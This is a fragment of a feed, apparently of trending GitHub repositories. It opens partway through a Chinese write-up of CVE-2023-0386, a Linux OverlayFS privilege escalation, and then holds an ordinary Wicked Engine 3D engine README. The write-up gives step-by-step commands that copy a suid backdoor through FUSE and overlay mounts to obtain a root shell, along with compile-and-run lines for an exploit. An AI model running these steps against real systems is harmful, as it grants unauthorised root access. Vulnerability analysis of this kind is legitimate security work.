&lt;pre&gt;&lt;code&gt;mkdir hello_mount_point  overlay_mount_point  upperdir  workdir #创建相关目录&#xA;./hellofs hello_mount_point                                     #挂载fuse文件系统&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230504153904268.png&#34; alt=&#34;image-20230504153904268&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;然后创建一个新的用户命名空间和mount命名空间还有pid命名空间，因为我们接下来需要创建overlay文件系统，默认情况下我们没有mount权限，所以需要在新的命名空间中获得mount的权限。&lt;/p&gt; &lt;pre&gt;&lt;code&gt;unshare -Urm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230504153934490.png&#34; alt=&#34;image-20230504153934490&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;创建overlay文件系统，使用上面的携带suid后门文件hello的fuse文件系统作为下层，上层就是我们可写的upper目录：&lt;/p&gt; &lt;pre&gt;&lt;code&gt;mount -t overlay overlay -o lowerdir=hello_mount_point,upperdir=upperdir,workdir=workdir overlay_mount_point&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230504154022811.png&#34; alt=&#34;image-20230504154022811&#34;&gt;&lt;/p&gt; &lt;p&gt;overlay当前效果如下图&lt;/p&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230504114747720.png&#34; alt=&#34;image-20230504114747720&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;现在我们的目标就是利用漏洞，将suid后门文件从nosuid挂载的fuse文件系统中拷贝到upper文件系统中，upper文件系统是操作系统的默认文件系统，是有suid的，这个操作会将后门文件连同他的suid属性一并拷贝过来。所以我们目前需要触发overlay文件系统的copy up操作，该操作通常是在我们尝试修改下层文件时触发的，这也是我们在fuse文件系统中将hello文件权限设置为777的原因。&lt;/p&gt; &#xA;&lt;h4&gt;touch命令冷知识&lt;/h4&gt; &#xA;&lt;p&gt;其实修改文件并不只是指修改文件内容，对于文件的其他属性的修改，比如文件时间戳等，也会触发copy up操作。&lt;strong&gt;而touch 命令在尝试创建一个已经存在的文件的时候不会覆盖已经存在的文件，而是只修改文件的访问时间和修改时间的时间戳，而时间戳信息也算文件的attr扩展信息，该信息被修改同样会触发overlay文件系统的向上拷贝。&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;调用栈如下，由于修改了文件的访问和修改时间戳，在ovl_setattr中触发了向上拷贝copy up：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230428112854184.png&#34; alt=&#34;image-20230428112854184&#34;&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt; &lt;p&gt;所以回到上面的操作步骤之中，我们只需要进入overlay文件系统的merge目录，使用touch修改后门文件hello的时间戳即可：&lt;/p&gt; &lt;pre&gt;&lt;code&gt;touch overlay_mount_point/hello&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230504154116918.png&#34; alt=&#34;image-20230504154116918&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;然后这里已经触发了copy up：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230504115008645.png&#34; alt=&#34;image-20230504115008645&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;我们查看上层目录即upper目录：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;ls -al upperdir&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230504154216784.png&#34; alt=&#34;image-20230504154216784&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;然后&lt;strong&gt;退出命名空间&lt;/strong&gt;执行&lt;code&gt;upperdir/hello&lt;/code&gt;即可获得root shell：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230504154316023.png&#34; alt=&#34;image-20230504154316023&#34;&gt;&lt;/p&gt; &#xA;&lt;h4&gt;exp&lt;/h4&gt; &#xA;&lt;p&gt;见exp.c&lt;/p&gt; &#xA;&lt;p&gt;编译与执行：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;gcc -Wall exp.c `pkg-config fuse --cflags --libs` -o exp&#xA;./exp /tmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;总结&lt;/h2&gt; &#xA;&lt;p&gt;所以这个补丁的意义在于，如果像我们这样操作来提权的话，那么初始命名空间中的root用户必然在新用户命名空间中没有得到映射(我们也没办法映射，因为这需要特权)，那么操作就会失败。而如果这个用户已经在新用户命名空间中得到映射，则认为是合法的场景。&lt;/p&gt; &#xA;&lt;h2&gt;参考&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://chat.openai.com/&#34;&gt;chatGPT&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>turanszkij/WickedEngine</title>
    <updated>2023-05-10T01:30:16Z</updated>
    <id>tag:github.com,2023-05-10:/turanszkij/WickedEngine</id>
    <link href="https://github.com/turanszkij/WickedEngine" rel="alternate"></link>
    <summary type="html">&lt;p&gt;3D engine with modern graphics&lt;/p&gt;&lt;hr&gt;&lt;img align=&#34;left&#34; src=&#34;https://raw.githubusercontent.com/turanszkij/WickedEngine/master/Content/logo_small.png&#34; width=&#34;180px&#34;&gt; &#xA;&lt;h1&gt;Wicked Engine&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/turanszkij/WickedEngine/actions&#34;&gt;&lt;img src=&#34;https://github.com/turanszkij/WickedEngine/workflows/Build/badge.svg?sanitize=true&#34; alt=&#34;Github Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://discord.gg/CFjRYmE&#34;&gt;&lt;img src=&#34;https://img.shields.io/discord/602811659224088577?logo=discord&#34; alt=&#34;Discord chat&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/intent/follow?screen_name=turanszkij&#34;&gt;&lt;img src=&#34;https://img.shields.io/twitter/follow/turanszkij.svg?style=social&#34; alt=&#34;follow on Twitter&#34;&gt;&lt;/a&gt; &lt;br&gt; &lt;a href=&#34;https://store.steampowered.com/app/1967460/Wicked_Engine/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-Steam-383838.svg?style=for-the-badge&amp;amp;logo=steam&#34; alt=&#34;Steam&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.microsoft.com/store/productId/9PPMV065W9QJ&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-Microsoft_Store-748FB2.svg?style=for-the-badge&amp;amp;logo=microsoft&#34; alt=&#34;Store&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;img align=&#34;right&#34; src=&#34;https://github.com/turanszkij/wickedengine-gifs/raw/main/npc.gif&#34; width=&#34;320px&#34;&gt; Wicked Engine is an open-source C++ engine focusing on modern rendering techniques and performance. Use this as a framework for your graphics projects, or learning. Some programming skills are required for the best experience, but some simple tools like an Editor are also included. It is free to be used for anything good.&#xA;&lt;br&gt; This project is hosted on &#xA;&lt;a href=&#34;https://github.com/turanszkij/WickedEngine/&#34;&gt;GitHub&lt;/a&gt;. &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/turanszkij/WickedEngine/master/Content/Documentation/WickedEngine-Documentation.md&#34;&gt;Documentation&lt;/a&gt;&lt;br&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/turanszkij/WickedEngine/master/Content/Documentation/ScriptingAPI-Documentation.md&#34;&gt;Scripting API Documentation&lt;/a&gt;&lt;br&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/turanszkij/WickedEngine/master/features.txt&#34;&gt;Features&lt;/a&gt;&lt;br&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://wickedengine.net/&#34;&gt;Devblog&lt;/a&gt;&lt;br&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/playlist?list=PLLN-1FTGyLU_HJoC5zx6hJkB3D2XLiaxS&#34;&gt;Videos&lt;/a&gt;&lt;br&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;You can download the source code by using Git and cloning the repository, or downloading it as zip. You can also choose to download a pre-built version of the Editor or Tests applications, which will allow you to try out features, load content and execute LUA scripts.&lt;br&gt; Tip: try loading models or scripts from the Content folder using the Editor app to see how everything works. &lt;br&gt;&lt;/p&gt; &#xA;&lt;img align=&#34;right&#34; src=&#34;https://github.com/turanszkij/wickedengine-gifs/raw/main/swimming.gif&#34; width=&#34;320px&#34;&gt; &#xA;&lt;h3&gt;Platforms:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Windows 10 or newer&lt;/li&gt; &#xA; &lt;li&gt;Linux&lt;/li&gt; &#xA; &lt;li&gt;UWP&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;How to build:&lt;/h3&gt; &#xA;&lt;h4&gt;Windows&lt;/h4&gt; &#xA;&lt;p&gt;To build Wicked Engine for Windows 10, use Visual Studio and the provided &lt;code&gt;WickedEngine.sln&lt;/code&gt; solution file. There are a couple of projects that you can run up front: Editor, Tests and Template. You just have to set either as startup project and press F5 in Visual Studio to build and run. For optimal performance, choose &lt;code&gt;Release&lt;/code&gt; mode, for the best debugging experience, choose &lt;code&gt;Debug&lt;/code&gt; mode.&lt;/p&gt; &#xA;&lt;img align=&#34;right&#34; src=&#34;https://github.com/turanszkij/wickedengine-gifs/raw/main/fighting_game.gif&#34; width=&#34;320px&#34;&gt; &#xA;&lt;p&gt;If you want to develop an application that uses Wicked Engine, you can build the WickedEngine static library project for the appropriate platform, such as &lt;code&gt;WickedEngine_Windows&lt;/code&gt; and link against it. Including the &lt;code&gt;&#34;WickedEngine.h&#34;&lt;/code&gt; header will attempt to link the binaries for the appropriate platform, but search directories should be set up beforehand. For example, you can set additional library directories to &lt;code&gt;$(SolutionDir)BUILD\$(Platform)\$(Configuration)&lt;/code&gt; by default. For examples, see the &lt;code&gt;Template&lt;/code&gt;, &lt;code&gt;Tests&lt;/code&gt;, and &lt;code&gt;Editor&lt;/code&gt; projects.&lt;/p&gt; &#xA;&lt;p&gt;You can also download prebuilt and packaged versions of the Editor and Tests here (requires Github sign in): &lt;a href=&#34;https://github.com/turanszkij/WickedEngine/actions&#34;&gt;&lt;img src=&#34;https://github.com/turanszkij/WickedEngine/workflows/Build/badge.svg?sanitize=true&#34; alt=&#34;Github Build Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;img align=&#34;right&#34; src=&#34;https://github.com/turanszkij/wickedengine-gifs/raw/main/inverse_kinematics.gif&#34; width=&#34;320px&#34;&gt; &#xA;&lt;p&gt;If you have questions or stuck, please use the &lt;code&gt;windows&lt;/code&gt; communication channel on Discord: &lt;a href=&#34;https://discord.gg/CFjRYmE&#34;&gt;&lt;img src=&#34;https://img.shields.io/discord/602811659224088577?logo=discord&#34; alt=&#34;Discord chat&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Note: Building 32-bit and ARM versions should be possible, but no longer provided by default. You will need to configure the solution for these platforms yourself if you want this. For ARM platform, also use the &lt;code&gt;-DBT_USE_DOUBLE_PRECISION=1&lt;/code&gt; definition when compiling.&lt;/p&gt; &#xA;&lt;p&gt;Cmake: It is possible to build the windows version with Cmake, but the recommended way is to use the provided WickedEngine.sln file with Visual Studio.&lt;/p&gt; &#xA;&lt;h4&gt;Linux&lt;/h4&gt; &#xA;&lt;p&gt;To build the engine for Linux, use Cmake. You can find a sample build script for Ubuntu 20.04 &lt;a href=&#34;https://raw.githubusercontent.com/turanszkij/WickedEngine/master/.github/workflows/build.yml&#34;&gt;here&lt;/a&gt; (in the linux section). You might need to install some dependencies, such as Cmake (3.7 or newer), g++ compiler (C++ 17 compliant version) and SDL2. For Ubuntu 20.04, you can use the following commands to install dependencies:&lt;/p&gt; &#xA;&lt;img align=&#34;right&#34; src=&#34;https://github.com/turanszkij/wickedengine-gifs/raw/main/grass.gif&#34; width=&#34;320px&#34;&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt update&#xA;sudo apt install libsdl2-dev&#xA;sudo apt install build-essential&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To build the engine, editor and tests, use &lt;code&gt;cmake&lt;/code&gt; and then &lt;code&gt;make&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mkdir build&#xA;cd build&#xA;cmake .. -DCMAKE_BUILD_TYPE=Release&#xA;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you want to develop an application that uses Wicked Engine, you will have to link to libWickedEngine.a and &lt;code&gt;#include &#34;WickedEngine.h&#34;&lt;/code&gt; into the source code. For examples, look at the Cmake files, or the Tests and the Editor applications.&lt;/p&gt; &#xA;&lt;p&gt;You can also download prebuilt and packaged versions of the Editor and Tests here (requires Github sign in): &lt;a href=&#34;https://github.com/turanszkij/WickedEngine/actions&#34;&gt;&lt;img src=&#34;https://github.com/turanszkij/WickedEngine/workflows/Build/badge.svg?sanitize=true&#34; alt=&#34;Github Build Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;If you have questions or stuck, please use the &lt;code&gt;linux&lt;/code&gt; communication channel on Discord: &lt;a href=&#34;https://discord.gg/CFjRYmE&#34;&gt;&lt;img src=&#34;https://img.shields.io/discord/602811659224088577?logo=discord&#34; alt=&#34;Discord chat&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Examples:&lt;/h3&gt; &#xA;&lt;h4&gt;Initialization (C++):&lt;/h4&gt; &#xA;&lt;img align=&#34;right&#34; src=&#34;https://github.com/turanszkij/wickedengine-gifs/raw/main/character_lookat.gif&#34; width=&#34;320px&#34;&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;// Include engine headers:&#xA;#include &#34;WickedEngine.h&#34;&#xA;&#xA;// Create the Wicked Engine application:&#xA;wi::Application application;&#xA;&#xA;// Assign window that you will render to:&#xA;application.SetWindow(hWnd);&#xA;&#xA;// Run the application:&#xA;while(true) {&#xA;   application.Run(); &#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Basics (C++):&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;wi::initializer::InitializeComponentsImmediate(); // (Optional) allows to initialize all components immediately and block the application until finished. Otherwise the initialization will take place at the first application.Run() asynchronously. This is useful if you want to start using other parts of the engine before application.Run() is called.&#xA;&#xA;wi::RenderPath3D myGame; // Declare a game screen component, aka &#34;RenderPath&#34; (you could also override its Update(), Render() etc. functions). &#xA;application.ActivatePath(&amp;amp;myGame); // Register your game to the application. It will call Start(), Update(), Render(), etc. from now on...&#xA;&#xA;wi::scene::LoadModel(&#34;myModel.wiscene&#34;); // Simply load a model into the current global scene&#xA;wi::scene::GetScene(); // Get the current global scene&#xA;&#xA;wi::scene::Scene scene2; // create a separate scene&#xA;wi::scene::LoadModel(scene2, &#34;myModel2.wiscene&#34;); // Load model into a separate scene&#xA;wi::scene::GetScene().Merge(scene2); // Combine separate scene with global scene&#xA;&#xA;myGame.setFXAAEnabled(true); // You can enable post process effects this way...&#xA;&#xA;wi::RenderPath2D myMenuScreen; // This is an other render path, but now a simple 2D one. It can only render 2D graphics by default (like a menu for example)&#xA;application.ActivatePath(&amp;amp;myMenuScreen); // activate the menu, the previous path (myGame) will be stopped&#xA;&#xA;wi::Sprite mySprite(&#34;image.png&#34;); // There are many utilities, such as a &#34;sprite&#34; helper class&#xA;myMenuScreen.AddSprite(&amp;amp;mySprite); // The 2D render path is ready to handle sprite and font rendering for you&#xA;&#xA;wi::audio::Sound mySound;&#xA;wi::audio::CreateSound(&#34;explosion.wav&#34;, &amp;amp;mySound); // Loads a sound file&#xA;wi::audio::SoundInstance mySoundInstance;&#xA;wi::audio::CreateSoundInstance(&amp;amp;mySound, &amp;amp;mySoundInstance); // Instances the sound file, it can be played now&#xA;wi::audio::Play(&amp;amp;mySoundInstance); // Play the sound instance&#xA;wi::audio::SetVolume(0.6, &amp;amp;mySoundInstance); // Set the volume of this soundinstance&#xA;wi::audio::SetVolume(0.2); // Set the master volume&#xA;&#xA;if (wi::input::Press(wi::input::KEYBOARD_BUTTON_SPACE)) { wi::audio::Stop(&amp;amp;mySoundInstance); } // You can check if a button is pressed or not (this only triggers once)&#xA;if (wi::input::Down(wi::input::KEYBOARD_BUTTON_SPACE)) { wi::audio::Play(&amp;amp;mySoundInstance); } // You can check if a button is pushed down or not (this triggers repeatedly)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Scripting (LUA):&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;-- Set a rendering path for the application&#xA;path = RenderPath3D;&#xA;application.SetActivePath(path);    -- &#34;application&#34; is created automatically by wi::Application&#xA;&#xA;-- Load a model entity into the global scene:&#xA;entity = LoadModel(&#34;myModel.wiscene&#34;);&#xA;&#xA;-- Load a model entity into a separate scene:&#xA;scene2 = Scene()&#xA;entity2 = LoadModel(scene2, &#34;myModel2.wiscene&#34;);&#xA;&#xA;-- Combine the separate scene with the global scene:&#xA;scene.Merge(scene2);&#xA;&#xA;-- Get the current global scene:&#xA;scene = GetScene();&#xA;&#xA;-- Move model to the right using the entity-component system:&#xA;transform = scene.Component_GetTransform(entity);&#xA;transform.Translate(Vector(2, 0, 0));&#xA;&#xA;-- Print any WickedEngine class information to the backlog:&#xA;getprops(application);&#x9;-- prints the application methods&#xA;getprops(scene);&#x9;-- prints the Scene class methods&#xA;getprops(path);&#x9;-- prints the deferred render path methods&#xA;&#xA;-- Play a sound:&#xA;sound = Sound()&#xA;audio.CreateSound(&#34;explosion.wav&#34;, sound)&#xA;soundinstance = SoundInstance()&#xA;audio.CreateSoundInstance(sound, soundinstance)  -- several instances can be created from one file&#xA;audio.Play(soundinstance)&#xA;audio.SetVolume(0.6, soundinstance)  -- sets the volume of this soundinstance&#xA;audio.SetVolume(0.2)  -- sets the master volume&#xA;&#xA;-- Check for input:&#xA;if(input.Press(KEYBOARD_BUTTON_LEFT)) then&#xA;   audio.Play(soundinstance); -- this will play the sound if you press the left arrow on the keyboard&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;i&gt;(You can enter lua scripts into the backlog (HOME button), or the startup.lua script which is always executed on application startup if it is found near the app, or load a script via dofile(&#34;script.lua&#34;) command)&lt;/i&gt;&lt;/p&gt; &#xA;&lt;p&gt;For more code samples and advanced use cases, please see the example projects, like the Template_Windows, Tests, or Editor project. There are also sample models and scripts included with Wicked Engine in the Content/models and Content/scripts folders. Check them out to learn about more features.&lt;/p&gt; &#xA;&lt;h3&gt;Scripting API:&lt;/h3&gt; &#xA;&lt;img align=&#34;right&#34; src=&#34;https://github.com/turanszkij/wickedengine-gifs/raw/main/clouds.gif&#34; width=&#34;320px&#34;&gt; &#xA;&lt;p&gt;You can use a great number of engine features through the Lua scripting api, which can even be used real time while the program is running. The included applications, like the Editor, contain a scripting input method toggled by the &#34;Home&#34; key. A blue screen will be presented where the user can type in LUA commands. It is very minimal in regards to input methods. For further details, please check the scripting API documentation: &lt;a href=&#34;https://raw.githubusercontent.com/turanszkij/WickedEngine/master/Content/Documentation/ScriptingAPI-Documentation.md&#34;&gt;Wicked Engine Scripting API&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Model import/export:&lt;/h3&gt; &#xA;&lt;p&gt;The native model format is the &lt;b&gt;WISCENE&lt;/b&gt; format. Any application using Wicked Engine can open this format efficiently.&lt;/p&gt; &#xA;&lt;p&gt;In addition, the Editor supports the importing of some common model formats (the list will potentially grow):&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;b&gt;OBJ&lt;/b&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;b&gt;GLTF 2.0&lt;/b&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;b&gt;VRM&lt;/b&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The preferred workflow is to import models into the Editor, and save them as &lt;b&gt;WISCENE&lt;/b&gt;, then any Wicked Engine application can open them.&lt;br&gt;&lt;/p&gt; &#xA;&lt;img align=&#34;right&#34; src=&#34;https://github.com/turanszkij/wickedengine-gifs/raw/main/snowstorm.gif&#34; width=&#34;320px&#34;&gt; &#xA;&lt;h3&gt;Graphics API:&lt;/h3&gt; &#xA;&lt;p&gt;The default renderer is &lt;code&gt;DirectX 12&lt;/code&gt; on Windows and &lt;code&gt;Vulkan&lt;/code&gt; on Linux. The &lt;code&gt;DirectX 11&lt;/code&gt; renderer is no longer available starting from version 0.57.0, but it can be found on the &lt;a href=&#34;https://github.com/turanszkij/WickedEngine/tree/dx11-backup&#34;&gt;dx11-backup branch&lt;/a&gt;. You can specify command line arguments (without any prefix) to switch between render devices or other settings. Currently the list of options:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;tbody&gt;&#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Argument&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;dx12&lt;/td&gt; &#xA;   &lt;td&gt;Use DirectX 12 rendering device&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;vulkan&lt;/td&gt; &#xA;   &lt;td&gt;Use Vulkan rendering device&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;debugdevice&lt;/td&gt; &#xA;   &lt;td&gt;Use debug layer for graphics API validation. Performance will be degraded, but graphics warnings and errors will be written to &#34;Output&#34; window&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;gpuvalidation&lt;/td&gt; &#xA;   &lt;td&gt;Use GPU Based Validation for graphics. This must be used together with the debugdevice argument. Currently DX12 only.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;gpu_verbose&lt;/td&gt; &#xA;   &lt;td&gt;Enable verbose GPU validation mode.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;igpu&lt;/td&gt; &#xA;   &lt;td&gt;Prefer integrated GPU selection for graphics. By default, dedicated GPU selection will be preferred.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;alwaysactive&lt;/td&gt; &#xA;   &lt;td&gt;The application will not be paused when the window is in the background.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt;&#xA;&lt;/table&gt; &#xA;&lt;img align=&#34;right&#34; src=&#34;https://github.com/turanszkij/wickedengine-gifs/raw/main/talking.gif&#34; width=&#34;320px&#34;&gt; &#xA;&lt;br&gt; &#xA;&lt;h3&gt;Other software using Wicked Engine&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.game-guru.com/max&#34;&gt;Game Guru MAX&lt;/a&gt;: Easy to use game creator software&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=0SxXmnSQ6Q4&#34;&gt;Flytrap&lt;/a&gt;: Demoscene production by qop&lt;/li&gt; &#xA; &lt;li&gt;Your project: add your project to this readme and open a pull request&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;br&gt; &#xA;&lt;h3&gt;Troubleshooting&lt;/h3&gt; &#xA;&lt;p&gt;If you are having trouble getting the applications to run, make sure that you satisfy the following conditions:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;If you built the application with Visual Studio, run it from the Visual Studio environment, where the executable working directory is set up to be the Project directory (not the build directory where the exe will be found)&lt;/li&gt; &#xA; &lt;li&gt;If you want to run an application without Visual Studio, either copy the executable from the BUILD directory to the correct project directory, or set the working directory appropriately. You can also check the Working directory setting in Visual Studio to find out the right working directory of every project.&lt;/li&gt; &#xA; &lt;li&gt;If you want to build UWP application, then you will first need to build the shaders into a shader dump. For that, build and run the &lt;code&gt;offlineshadercompiler&lt;/code&gt; project with the &lt;code&gt;hlsl6 shaderdump&lt;/code&gt; command line arguments. If the &lt;code&gt;wiShaderDump.h&lt;/code&gt; file is successfully generated, rebuilding the engine will embed all the shader files so they are not loaded separately. But embedded shaders also cannot be recompiled during runtime.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;img align=&#34;right&#34; src=&#34;https://github.com/turanszkij/wickedengine-gifs/raw/main/weather.gif&#34; width=&#34;320px&#34;&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;If you experience crashes, follow these steps to find out the problem: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;make sure your environment is up to date, with latest graphics drivers and operating system updates.&lt;/li&gt; &#xA;   &lt;li&gt;see if there is a wiBackLog.txt in your user temp folder (for example: C:\Users\username\AppData\Local\Temp), and request help on Discord or Github issue&lt;/li&gt; &#xA;   &lt;li&gt;build the engine in Debug mode and try to run it, see where it crashes, provide call stack on Discord or Github issue&lt;/li&gt; &#xA;   &lt;li&gt;run the engine with the &lt;code&gt;debugdevice&lt;/code&gt; command argument and post the text from your console output window when the crash happens&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>